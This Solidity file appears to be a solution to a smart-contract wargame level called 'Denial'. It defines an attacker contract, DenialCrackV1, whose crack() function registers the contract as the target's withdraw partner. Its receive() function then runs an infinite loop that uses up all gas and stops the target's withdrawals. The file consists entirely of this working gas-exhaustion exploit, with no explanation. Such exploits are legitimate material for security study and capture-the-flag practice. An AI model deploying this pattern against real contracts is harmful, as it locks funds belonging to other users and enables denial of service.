// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
import "hardhat/console.sol";

interface DenialI {
    function setWithdrawPartner(address _partner) external;

    function withdraw() external;
}

contract DenialCrackV1 {
    address payable public owner;
    DenialI targetContractI;

    constructor(address targetContract) payable {
        owner = payable(msg.sender);
        targetContractI = DenialI(targetContract);
    }

    function crack() public {
        require(msg.sender == owner, "You aren't the owner");
        targetContractI.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}
